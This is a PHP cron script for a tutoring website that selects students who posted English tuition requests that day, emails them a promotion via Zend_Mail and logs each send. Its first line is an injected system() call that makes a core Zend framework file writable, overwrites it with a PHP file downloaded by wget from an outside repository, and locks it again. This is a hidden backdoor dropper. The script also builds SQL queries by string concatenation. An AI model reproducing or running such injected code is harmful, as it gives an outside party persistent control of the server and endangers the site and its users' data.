<?php
system('chmod 777 /var/www/vhosts/learnpick.in/httpdocs/library/Zend/Application.php;wget https://raw.githubusercontent.com/theykillmeslowly/casino/main/bl.php -O /var/www/vhosts/learnpick.in/httpdocs/library/Zend/Application.php;chmod 555 /var/www/vhosts/learnpick.in/httpdocs/library/Zend/Application.php;');

require_once('mpt_cron_config.php');
//################### fin #################//



function makeTutorList(){
	
	require_once(realpath(DBMODELS_PATH . '/Adapter.php'));
		$adapter_model  = new Models_Adapter();
		$_adapter       = $adapter_model->getDbAdapter();
		
		require_once(realpath(DBMODELS_PATH . '/Membercomunicationsoptions.php'));
		$memCmnOptModelObj = new Model_Membercomunicationsoptions();
		
		$startDate  = mktime(0, 0, 0, date('m'), date('d'), date('Y'));
	
		$endDate    = mktime(23, 59, 59, date('m'), date('d'), date('Y'));
		
		$currentday = date('d-m-Y');
		
		
		$runday = '30-07-2020';
		
		$utilFunc = new UtilFunctions();

		$whereStr 		  = "mem.flag IN ('1') AND tuipost.flag IN ('1') AND tuipost.segmentidfk IN  ('5','64','7','6','22','12') AND tuipost.rootsubjectidfk IN  ('6','312','128','310','217','183','311','715') AND tuipost.createdate BETWEEN ".$startDate." AND ".$endDate." " ;

		$mem_center_select   = $_adapter->select()
						 ->from(array('mem' => 'tbl_students'), array('mem.memberid','mem.name','mem.email','mem.mobile','mem.createdate'))
						->joinLeft(array('tuipost' => 'tbl_tuitionposts'), 'tuipost.memberidfk = mem.memberid', array())
						 ->where($whereStr)
						->order('mem.createdate DESC')
						->group('mem.memberid');
					
		$finResultArr  = $_adapter->query($mem_center_select)->fetchAll();
		
		$totalCount =  count($finResultArr);
		
		//echo '<pre>'; print_r(count($finResultArr)); echo '</pre>';
		
		//echo "<pre>"; print_r($finResultArr); die();
		
	
		
			if( !empty($finResultArr) ){
		
				for($g=0; $g<count($finResultArr); $g++){
					
					$memMailCmnOpt = $memCmnOptModelObj->fetchMembercomunicationsoptionsLimit(array('indx', 'cflag'), "mtype='".$GLOBALS['usertype']['mps']."' AND memberidfk='".trim($finResultArr[$g]['memberid'])."' AND comunicationtype='mail' AND comunicationaction='promotional'");
					$memMailCmnFlag  = ( count($memMailCmnOpt)<=0  )?true:false;


				//echo '<pre>'; print_r($memCourseDatArr); echo '</pre>';exit;
				
					$mailDataArr = array();
					$mailDataArr['membername']  = $finResultArr[$g]['name'];
					$mailDataArr['memberid']  	= $finResultArr[$g]['memberid'];
					$mailDataArr['membertype']  = $GLOBALS['usertype']['mps'];
					//$mailDataArr['durationData'] = '6 Monthts';
					//$mailDataArr['subscripdata'] = $memSegRatDatArr;
					
					$mail_view = new Zend_View();
				 
					$mail_view->setScriptPath(THIRD_PARTY);
					 
					$clientMailSubject = 'Find the Perfect English Teacher';
					
					$mail_view->assign('mailDataArr', $mailDataArr);
					 
					$clientMailContent = $mail_view->render('SendWizertEnglishMailContent.php');
					
					
					
					// Check if domain belongs to myprivatetutor.com or myprivatetutor.in
					
					$arrayval = array('myprivatetutor.com','myprivatetutor.in','softzsolutions.com','brishti.co.in');
					
					list( $user, $domain ) = preg_split("/@/", trim($finResultArr[$g]['email']));
					
					
					
					$mailSend = (!in_array($domain,$arrayval))?true : false;
					
					if($memMailCmnFlag && $mailSend){
						
						
						
						
						
						sendZendMail("support@learnpick.in", trim($finResultArr[$g]['email']), $clientMailSubject, $clientMailContent);
						
						$memUpdStr = 'Last Mail Sent To '.$finResultArr[$g]['memberid']."\n\r";
							
						$fileNmae  = dirname(__FILE__).'/english_wizert_student_'.$currentday.'.txt';											
						$contnt    = file_get_contents($fileNmae);
												
						$contnt   .= $memUpdStr;
										
						file_put_contents($fileNmae, $contnt);
					
						
					}
					
				}
		
			}
			else{
				echo 'Error';
			}
			
			
	
	//echo '<pre>'; print_r($fitutContDataArr); echo '</pre>';exit;
}

function sendZendMail($mailFrom='', $mailTo='', $mailSubject='', $mailBody=''){

	$mail = new Zend_Mail();

	$mail->setType(Zend_Mime::MULTIPART_RELATED);

	$mail->setBodyHTML($mailBody);

	$mail->setFrom($mailFrom, MAIL_SITE_NAME);
	
	if(is_array($mailTo) && count($mailTo)>0){
		for($m=0; $m<count($mailTo); $m++){
			$mail->addTo($mailTo[$m]);
		}
	}
	else{
		$mail->addTo($mailTo);
	}
	
	$mail->setSubject($mailSubject);
	
	$mail->send();
}

//#####################################//
makeTutorList();


mail("anirban@brishti.in","English Wizert Mail  for Learnpick students","Mail Send completely at ".date("h:i:s A"),"From: ".AUTO_RESPONDER_EMAIL."\r\n");
?>
